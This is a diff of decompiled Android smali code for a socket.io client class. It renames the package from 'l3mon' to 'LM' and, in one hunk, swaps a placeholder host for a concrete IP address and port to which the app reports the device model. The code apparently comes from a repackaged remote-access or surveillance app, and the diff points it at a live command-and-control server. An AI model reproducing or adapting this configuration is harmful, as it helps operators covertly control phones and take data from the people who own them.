@@ -1,10 +1,10 @@
-.class public Lcom/etechd/l3mon/IOSocket;
+.class public Lcom/etechd/LM/IOSocket;
 .super Ljava/lang/Object;
 .source "IOSocket.java"
 
 
 # static fields
-.field private static ourInstance:Lcom/etechd/l3mon/IOSocket;
+.field private static ourInstance:Lcom/etechd/LM/IOSocket;
 
 
 # instance fields
@@ -16,11 +16,11 @@
     .locals 1
 
     .line 10
-    new-instance v0, Lcom/etechd/l3mon/IOSocket;
+    new-instance v0, Lcom/etechd/LM/IOSocket;
 
-    invoke-direct {v0}, Lcom/etechd/l3mon/IOSocket;-><init>()V
+    invoke-direct {v0}, Lcom/etechd/LM/IOSocket;-><init>()V
 
-    sput-object v0, Lcom/etechd/l3mon/IOSocket;->ourInstance:Lcom/etechd/l3mon/IOSocket;
+    sput-object v0, Lcom/etechd/LM/IOSocket;->ourInstance:Lcom/etechd/LM/IOSocket;
 
     return-void
 .end method
@@ -33,7 +33,7 @@
 
     .line 18
     :try_start_0
-    invoke-static {}, Lcom/etechd/l3mon/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/etechd/LM/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v0
 
@@ -74,7 +74,7 @@
 
     invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
 
-    const-string v3, "http://x:22222?model="
+    const-string v3, "http://40.71.59.211:22222?model="
 
     invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -116,7 +116,7 @@
 
     move-result-object v2
 
-    iput-object v2, p0, Lcom/etechd/l3mon/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iput-object v2, p0, Lcom/etechd/LM/IOSocket;->ioSocket:Lio/socket/client/Socket;
     :try_end_0
     .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -139,11 +139,11 @@
     return-void
 .end method
 
-.method public static getInstance()Lcom/etechd/l3mon/IOSocket;
+.method public static getInstance()Lcom/etechd/LM/IOSocket;
     .locals 1
 
     .line 32
-    sget-object v0, Lcom/etechd/l3mon/IOSocket;->ourInstance:Lcom/etechd/l3mon/IOSocket;
+    sget-object v0, Lcom/etechd/LM/IOSocket;->ourInstance:Lcom/etechd/LM/IOSocket;
 
     return-object v0
 .end method
@@ -154,7 +154,7 @@
     .locals 1
 
     .line 36
-    iget-object v0, p0, Lcom/etechd/l3mon/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iget-object v0, p0, Lcom/etechd/LM/IOSocket;->ioSocket:Lio/socket/client/Socket;
 
     return-object v0
 .end method
